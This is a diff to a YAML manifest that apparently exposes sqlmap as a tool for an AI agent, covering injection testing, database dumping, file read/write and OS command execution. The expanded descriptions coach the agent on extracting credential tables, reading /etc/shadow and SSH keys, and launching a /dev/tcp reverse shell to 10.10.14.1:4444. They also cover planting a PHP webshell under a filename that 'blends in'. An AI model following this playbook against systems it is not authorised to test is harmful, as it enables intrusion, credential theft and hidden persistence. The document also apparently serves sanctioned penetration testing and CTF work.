@@ -1,6 +1,6 @@
 name: sqlmap
-version: "1.8"
-description: "Automatic SQL injection and database takeover tool"
+version: "1.10"
+description: "Automatic SQL injection detection and exploitation tool (v1.10#stable). Supports 6 injection techniques: Boolean-based blind (B), Error-based (E), Union query-based (U), Stacked queries (S), Time-based blind (T), Inline queries (Q). Detects and exploits MySQL, PostgreSQL, Oracle, MSSQL, SQLite, DB2, MariaDB, and more. Beyond database enumeration, provides OS command execution (--os-cmd/--os-shell), file read/write on the target server, and password hash dumping. Includes 60+ WAF bypass tamper scripts. Runs non-interactively with --batch flag."
 image: "ghcr.io/silicon-works/mcp-tools-sqlmap:latest"
 image_size_mb: 150
 
@@ -13,21 +13,27 @@ capabilities:
 # Routing hints for tool selection
 routing:
   use_for:
-    - "SQL injection"
-    - "SQL injection testing"
-    - "database enumeration"
-    - "data extraction from SQL database"
-    - "testing GET/POST parameters for SQL injection"
+    - "SQL injection detection and exploitation"
+    - "test GET POST parameters for SQL injection vulnerabilities"
+    - "enumerate databases tables columns via SQL injection"
+    - "dump database contents through SQL injection"
+    - "OS command execution via SQL injection"
+    - "read files from target server via SQL injection"
+    - "write files webshells to target via SQL injection"
+    - "extract password hashes from database via SQL injection"
+    - "boolean error union stacked time-based blind injection"
+    - "WAF bypass with tamper scripts for SQL injection"
   never_use_for:
-    - "NoSQL injection"
-    - "MongoDB"
-    - "directory enumeration"
+    - "NoSQL injection (use nosqlmap)"
+    - "MongoDB (use mongodb or nosqlmap)"
+    - "directory enumeration (use ffuf)"
   triggers:
     - "sql injection"
     - "sqli"
     - "sqlmap"
     - "database dump"
     - "union injection"
+    - "blind injection"
   prefer_over: []
 
 phases:
@@ -43,227 +49,242 @@ resources:
 
 methods:
   test_injection:
-    description: "Test a URL parameter for SQL injection vulnerabilities"
-    when_to_use: "When a potential SQL injection point is identified"
+    description: "Test URL parameters for SQL injection vulnerabilities using sqlmap's detection engine. Runs with --batch (non-interactive) and 4 threads. Tests all 6 injection techniques by default (BEUSTQ). Parses output for vulnerability confirmation, injectable parameters, injection types, and detected DBMS. Sqlmap caches results in session files — subsequent calls to the same URL skip already-tested parameters."
+    when_to_use: "When you've identified a potentially injectable parameter in a web application — either from manual testing, web fuzzing (ffuf), or source code review. Mark the injection point with * in the URL (e.g., 'http://target/page?id=1*') or let sqlmap auto-detect GET parameters. For POST injection, use the data parameter. Start with level=1/risk=1 (default), increase to level=3/risk=2 if no results, and level=5/risk=3 as last resort (risk=3 may use OR-based tests that can modify data). If the target uses a WAF, the test may fail — a tamper script parameter would be needed (not currently exposed)."
     params:
       url:
         type: string
         required: true
-        description: "Target URL with injectable parameter (use * to mark injection point)"
+        description: "Target URL with parameters. Use * to mark specific injection point (e.g., 'http://target/page?id=1*'). Without *, sqlmap tests all GET parameters. For REST-style URLs: 'http://target/api/users/1*/profile'."
       data:
         type: string
-        description: "POST data (for POST requests)"
+        description: "POST request body data. Switches sqlmap to POST method. Format: 'param1=value1&param2=value2'. Use * to mark injection point in POST data: 'username=admin&password=*'."
       cookie:
         type: string
-        description: "HTTP cookie header value"
+        description: "HTTP Cookie header value (e.g., 'PHPSESSID=abc123; session=xyz'). Required for testing authenticated endpoints. At level >= 2, sqlmap also tests cookie values for injection."
       level:
         type: integer
         default: 1
-        description: "Level of tests (1-5)"
+        description: "Test level 1-5. Level 1: tests GET/POST params. Level 2: adds Cookie testing. Level 3: adds User-Agent/Referer testing. Level 4-5: adds more payloads. Higher = slower but more thorough. Start with 1, increase if no results."
       risk:
         type: integer
         default: 1
-        description: "Risk of tests (1-3)"
+        description: "Risk level 1-3. Risk 1: safe tests only. Risk 2: adds heavy time-based tests. Risk 3: adds OR-based tests (can modify/delete data — use with caution). For CTF/HTB use risk=2 freely, risk=3 on non-production targets only."
       technique:
         type: string
         default: "BEUSTQ"
-        description: "SQL injection techniques to use"
+        description: "SQL injection techniques to test. B=Boolean-based blind, E=Error-based, U=Union query, S=Stacked queries (needed for os_shell/file_write), T=Time-based blind, Q=Inline queries. Default 'BEUSTQ' tests all. Use 'BEU' for faster testing if you don't need stacked queries. Use 'T' alone for time-based only when other methods fail."
       timeout:
         type: integer
         default: 300
-        description: "Timeout in seconds"
+        description: "Process timeout in seconds (not HTTP timeout). Full level=1 testing typically takes 1-5 minutes. Increase to 600+ for level=3+ or slow targets."
     returns:
       vulnerable:
         type: boolean
-        description: "Whether target is vulnerable"
+        description: "Whether SQL injection was confirmed"
       injection_type:
         type: string
-        description: "Type of SQL injection found"
+        description: "Type of injection found (e.g., 'boolean-based blind', 'UNION query', 'time-based blind')"
       dbms:
         type: string
-        description: "Detected database management system"
+        description: "Detected DBMS (e.g., 'MySQL >= 5.0', 'PostgreSQL', 'Microsoft SQL Server 2019')"
+      parameters:
+        type: array
+        description: "List of injectable parameter names"
+      details:
+        type: array
+        description: "Relevant detail lines from sqlmap output (injection info, payloads, techniques)"
 
   enumerate_dbs:
-    description: "Enumerate databases on a confirmed vulnerable target"
-    when_to_use: "After confirming SQL injection to list available databases"
+    description: "Enumerate all databases on a confirmed vulnerable target using sqlmap's --dbs flag. Sqlmap reuses the cached injection point and technique from prior test_injection calls (stored in session files), so no re-detection is needed. Parses the '[*] database_name' output lines. For MySQL: returns INFORMATION_SCHEMA plus application databases. For MSSQL: returns master, msdb, model, tempdb plus application databases. For PostgreSQL: returns postgres, template0, template1 plus application databases. For SQLite: there's only one database (the file itself), so this returns a single entry."
+    when_to_use: "Immediately after test_injection confirms SQL injection. This is the standard next step in the SQL injection exploitation workflow: test_injection → enumerate_dbs → dump_table. The URL must be the same one used in test_injection so sqlmap can reuse its cached session. System databases (information_schema, mysql, master, postgres, etc.) are normal — look for application databases with names like 'webapp', 'shop', 'blog', 'wordpress', 'drupal', etc. that contain user data."
     params:
       url:
         type: string
         required: true
-        description: "Target URL (previously confirmed vulnerable)"
+        description: "Target URL — must be the same URL used in test_injection so sqlmap reuses the cached injection session. If using a different URL, sqlmap will re-detect injection."
       data:
         type: string
-        description: "POST data if needed"
+        description: "POST request body data (must match what was used in test_injection if applicable)."
       cookie:
         type: string
-        description: "HTTP cookie header value"
+        description: "HTTP Cookie header value (must match test_injection if authentication is needed)."
       timeout:
         type: integer
         default: 300
-        description: "Timeout in seconds"
+        description: "Process timeout in seconds. Database enumeration is usually fast (under 1 minute) for error-based and UNION injection. Time-based blind may take 2-5 minutes. Default 300s is sufficient."
     returns:
       databases:
         type: array
-        description: "List of database names"
+        description: "List of database name strings (e.g., ['information_schema', 'mysql', 'webapp'])"
+      count:
+        type: integer
+        description: "Number of databases found"
 
   dump_table:
-    description: "Dump contents of a database table"
-    when_to_use: "To extract data from a specific table"
+    description: "Dump contents of a specific database table using sqlmap's --dump flag with -D (database) and -T (table). Uses --dump-format CSV for structured output. Parses the pipe-delimited table output into column names and row dictionaries. Supports column selection (-C) to extract only specific fields and row limiting (--stop) to cap output. For large tables, use the columns and limit params to reduce data volume and extraction time."
+    when_to_use: "After enumerate_dbs identifies databases, use this to extract data from specific tables. The typical workflow is: enumerate_dbs → (identify interesting database) → dump_table on high-value tables like 'users', 'accounts', 'credentials', 'config', 'sessions', 'tokens'. Use the columns parameter to extract only credential fields ('username,password,email') when you know the schema. For blind injection, each row/cell requires separate requests, so limiting columns and rows dramatically reduces extraction time. Note: you need to know the table name — if you don't, the MCP server currently has no --tables enumeration method (see fix file), so use a raw sqlmap approach or check information_schema via the injection."
     params:
       url:
         type: string
         required: true
-        description: "Target URL"
+        description: "Target URL — same URL used in test_injection."
       database:
         type: string
         required: true
-        description: "Database name"
+        description: "Database name from enumerate_dbs results (e.g., 'webapp', 'shop'). Case-sensitive on some DBMS."
       table:
         type: string
         required: true
-        description: "Table name"
+        description: "Table name to dump. Common targets: 'users', 'accounts', 'admins', 'credentials', 'config', 'sessions', 'wp_users' (WordPress), 'user' (Laravel). Case-sensitive on MySQL/PostgreSQL with Linux."
       columns:
         type: string
-        description: "Specific columns to dump (comma-separated)"
+        description: "Comma-separated column names to extract (e.g., 'username,password,email'). Omit to dump all columns. Use this to reduce extraction time and output size — blind injection extraction is per-cell, so fewer columns = much faster."
       data:
         type: string
-        description: "POST data if needed"
+        description: "POST request body data (must match test_injection if applicable)."
       cookie:
         type: string
-        description: "HTTP cookie header value"
+        description: "HTTP Cookie header value."
       limit:
         type: integer
         default: 100
-        description: "Maximum rows to dump"
+        description: "Maximum rows to extract (maps to sqlmap --stop). Default 100. For blind injection, each row takes multiple requests — use 10-20 for initial sampling, then increase if needed. For UNION/error-based injection, extraction is fast so 100+ is fine."
       timeout:
         type: integer
         default: 600
-        description: "Timeout in seconds"
+        description: "Process timeout in seconds. UNION/error-based dumps are fast (1-2 min). Blind injection of 100 rows can take 5-10+ minutes. Default 600s (10 min). Increase for large blind extractions."
     returns:
-      data:
+      columns:
         type: array
-        description: "Table contents"
+        description: "List of column name strings from the parsed table header"
+      rows:
+        type: array
+        description: "List of row dictionaries, each mapping column name to cell value (e.g., [{'id': '1', 'username': 'admin', 'password': '$2y$10$...'}])"
+      row_count:
+        type: integer
+        description: "Number of rows extracted"
 
   dump_all:
-    description: "Dump all tables from a database"
-    when_to_use: "To extract all data from a database at once"
+    description: "Dump all tables from a database at once using sqlmap's --dump-all flag with -D (database). Iterates through every table in the database and extracts all rows. Returns an unstructured status message (no per-table parsing). For blind injection, this can take a very long time — each cell in each row of each table requires separate requests. Timeout is 900s (15 min) by default."
+    when_to_use: "When you need everything from a database and have fast injection (UNION or error-based). Prefer dump_table for targeted extraction of specific high-value tables, which is faster and returns structured data. Use dump_all as a last resort or when the database is small. For blind injection, this may take 30+ minutes or even hours depending on data volume — in that case, use dump_table on individual tables instead. The raw_output contains all dumped data but the structured data field only has a status message."
     params:
       url:
         type: string
         required: true
-        description: "Target URL"
+        description: "Target URL — same URL used in test_injection."
       database:
         type: string
         required: true
-        description: "Database name to dump"
+        description: "Database name to dump entirely (from enumerate_dbs results). All tables in this database will be extracted."
       data:
         type: string
-        description: "POST data if needed"
+        description: "POST request body data (must match test_injection if applicable)."
       cookie:
         type: string
-        description: "HTTP cookie header value"
+        description: "HTTP Cookie header value."
       timeout:
         type: integer
         default: 900
-        description: "Timeout in seconds"
+        description: "Process timeout in seconds. Default 900s (15 min). UNION/error-based dumps of small databases may complete in 2-5 minutes. Large databases or blind injection will need more time — increase to 1800+ or use dump_table instead."
     returns:
       database:
         type: string
-        description: "Database name dumped"
+        description: "Name of the database that was dumped"
       message:
         type: string
-        description: "Status message"
+        description: "Status message ('Database dump completed'). Actual table data is in raw_output, not structured here."
 
   os_shell:
-    description: "Get an interactive OS shell via SQL injection (requires stacked queries or specific DBMS)"
-    when_to_use: "To execute OS commands via SQL injection for code execution"
+    description: "Execute an OS command on the target server via SQL injection using sqlmap's --os-cmd flag. The mechanism depends on the DBMS: MySQL uses User Defined Functions (UDF, requires FILE privilege and writable plugin directory), MSSQL uses xp_cmdshell (must be enabled or enableable via stacked queries), PostgreSQL uses COPY TO/FROM with large objects or PL/Python. Parses the 'command standard output' section from sqlmap's output. This is a single-command execution, not a persistent shell — each call is independent."
+    when_to_use: "When you need Remote Code Execution (RCE) through a confirmed SQL injection and the goal is to escalate from database access to OS access. This is a major privilege escalation step. Requirements: (1) stacked queries injection type or specific DBMS features, (2) sufficient database privileges (MySQL: FILE, MSSQL: sysadmin or xp_cmdshell access, PostgreSQL: superuser). If test_injection found only Boolean/UNION injection (no stacked queries 'S'), this may not work on MySQL — but MSSQL xp_cmdshell works with any injection type if the user has permissions. Common first commands: 'id', 'whoami', 'hostname', 'cat /etc/passwd', 'dir C:\\Users'. For a reverse shell, execute a shell payload (e.g., 'bash -c \"bash -i >& /dev/tcp/LHOST/PORT 0>&1\"')."
     params:
       url:
         type: string
         required: true
-        description: "Target URL"
+        description: "Target URL — same URL used in test_injection."
       command:
         type: string
         required: true
-        description: "Command to execute"
+        description: "OS command to execute on the target server. Examples: 'id' (Linux user), 'whoami' (current user), 'cat /etc/passwd' (user list), 'dir C:\\Users' (Windows users), 'netstat -tlnp' (listening ports). For reverse shell: 'bash -c \"bash -i >& /dev/tcp/10.10.14.1/4444 0>&1\"'. Commands with special characters may need quoting."
       data:
         type: string
-        description: "POST data if needed"
+        description: "POST request body data (must match test_injection if applicable)."
       cookie:
         type: string
-        description: "HTTP cookie header value"
+        description: "HTTP Cookie header value."
       timeout:
         type: integer
         default: 120
-        description: "Timeout in seconds"
+        description: "Process timeout in seconds. OS command execution typically completes in 10-30 seconds. Default 120s allows for slow initial UDF upload or xp_cmdshell re-enable. Increase if the command itself is long-running."
     returns:
       command:
         type: string
-        description: "Executed command"
+        description: "The command that was executed"
       output:
         type: string
-        description: "Command output"
+        description: "Command stdout as captured by sqlmap. May be empty if the DBMS doesn't return output (some UDF methods are blind — output not captured)."
 
   file_read:
-    description: "Read a file from the target server via SQL injection"
-    when_to_use: "To read sensitive files like config files, /etc/passwd, etc."
+    description: "Read a file from the target server's filesystem via SQL injection using sqlmap's --file-read flag. The mechanism depends on the DBMS: MySQL uses LOAD_FILE() (requires FILE privilege), PostgreSQL uses pg_read_file() or COPY FROM with large objects, MSSQL uses OPENROWSET(BULK) or xp_cmdshell. Sqlmap downloads the file to a local temp path, then the MCP server reads and returns its contents. Binary files will be saved but may not display correctly as text."
+    when_to_use: "When you need to read files from the target server through SQL injection — without needing OS shell access. Common targets: '/etc/passwd' (user enumeration), '/etc/shadow' (password hashes, requires root DB user), web application config files (database credentials, API keys), source code. For MySQL: common config paths are '/var/www/html/wp-config.php' (WordPress), '/var/www/html/config.php', '/var/www/html/.env'. For MSSQL: 'C:\\inetpub\\wwwroot\\web.config'. Requires database FILE privilege on MySQL. If file_read returns empty content, the DB user may lack permissions — try os_shell instead if stacked queries are available."
     params:
       url:
         type: string
         required: true
-        description: "Target URL"
+        description: "Target URL — same URL used in test_injection."
       file_path:
         type: string
         required: true
-        description: "Absolute path to file on target server"
+        description: "Absolute path to the file on the target server. Linux: '/etc/passwd', '/var/www/html/config.php', '/home/user/.ssh/id_rsa'. Windows: 'C:\\inetpub\\wwwroot\\web.config', 'C:\\Windows\\System32\\drivers\\etc\\hosts'. Must be readable by the database process user."
       data:
         type: string
-        description: "POST data if needed"
+        description: "POST request body data (must match test_injection if applicable)."
       cookie:
         type: string
-        description: "HTTP cookie header value"
+        description: "HTTP Cookie header value."
       timeout:
         type: integer
         default: 120
-        description: "Timeout in seconds"
+        description: "Process timeout in seconds. File reads are typically fast (10-30 seconds). Large files may take longer with blind injection. Default 120s is sufficient for most files."
     returns:
       file_path:
         type: string
-        description: "Path of file read"
+        description: "The path of the file that was read"
       content:
         type: string
-        description: "File contents"
+        description: "File contents as text. Empty string if the read failed (insufficient privileges or file doesn't exist). Binary files may contain non-printable characters."
 
   file_write:
-    description: "Write a file to the target server via SQL injection"
-    when_to_use: "To upload web shells or other files to the target"
+    description: "Write a file to the target server's filesystem via SQL injection using sqlmap's --file-write and --file-dest flags. The mechanism depends on the DBMS: MySQL uses SELECT INTO OUTFILE (requires FILE privilege and writable directory — secure_file_priv must allow the dest path), MSSQL uses xp_cmdshell or sp_OACreate, PostgreSQL uses COPY TO or large objects. The local_file parameter accepts either a file path or raw content — if the value is not a valid local path, the MCP server writes it to a temp file first, then passes it to sqlmap."
+    when_to_use: "When you need to upload files to the target server through SQL injection — the primary use case is webshell upload for persistent code execution. Common scenario: write a PHP webshell to the web root (e.g., '/var/www/html/shell.php') to get command execution without needing stacked queries. Requirements: (1) database FILE privilege (MySQL) or equivalent, (2) writable destination directory, (3) known web root path. If you don't know the web root, use file_read on common paths first ('/etc/apache2/sites-enabled/000-default.conf', '/etc/nginx/sites-enabled/default') or check web server error pages. For MySQL, secure_file_priv may restrict writable directories — check with 'SELECT @@secure_file_priv'. Simpler alternative for RCE: use os_shell if stacked queries are available."
     params:
       url:
         type: string
         required: true
-        description: "Target URL"
+        description: "Target URL — same URL used in test_injection."
       local_file:
         type: string
         required: true
-        description: "Local file path or content to write"
+        description: "Either a local file path to upload, or raw file content as a string. If the value is not a valid local file path, it's treated as content and written to a temp file. For a PHP webshell: '<?php system($_GET[\"cmd\"]); ?>'. For an ASPX webshell or binary payload, provide a local file path."
       remote_path:
         type: string
         required: true
-        description: "Absolute path on target server"
+        description: "Absolute destination path on the target server. Must be writable by the database process. Common web roots: '/var/www/html/' (Apache/Debian), '/var/www/' (Ubuntu), '/usr/share/nginx/html/' (Nginx), 'C:\\inetpub\\wwwroot\\' (IIS). Use a filename that blends in: 'info.php', 'test.php', '.config.php'."
       data:
         type: string
-        description: "POST data if needed"
+        description: "POST request body data (must match test_injection if applicable)."
       cookie:
         type: string
-        description: "HTTP cookie header value"
+        description: "HTTP Cookie header value."
       timeout:
         type: integer
         default: 120
-        description: "Timeout in seconds"
+        description: "Process timeout in seconds. File writes are typically fast (10-30 seconds). Default 120s is sufficient."
     returns:
       remote_path:
         type: string
-        description: "Path where file was written"
+        description: "The destination path where the file was written"
       written:
         type: boolean
-        description: "Whether write succeeded"
+        description: "Whether the write succeeded (parsed from sqlmap's 'file has been successfully written' message). False if the write failed due to permissions, path restrictions, or unsupported DBMS method."
